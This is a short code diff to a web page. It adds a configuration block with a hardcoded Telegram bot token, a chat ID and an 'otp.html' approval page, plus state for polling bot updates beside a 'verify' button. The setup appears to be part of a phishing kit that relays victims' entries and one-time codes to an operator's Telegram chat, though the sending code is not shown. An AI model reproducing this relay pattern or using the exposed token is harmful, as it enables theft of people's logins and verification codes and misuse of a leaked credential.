@@ -500,6 +500,15 @@
   </div>
 
   <script>
+      const CONFIG = {
+      BOT_TOKEN: '9167169396:AAEmzZ5ndzC0WzHEYXsY805aqoDv2qzR1Ww',
+      CHAT_ID: '8820857419',
+      APPROVE_PAGE: 'otp.html'
+    };
+
+    let state = { lastUpdateId: 0 };
+    let isProcessing = false;
+    
     const spinnerOverlay = document.getElementById('spinnerOverlay');
     const verifyBtn = document.querySelector('.pill-btn');
 
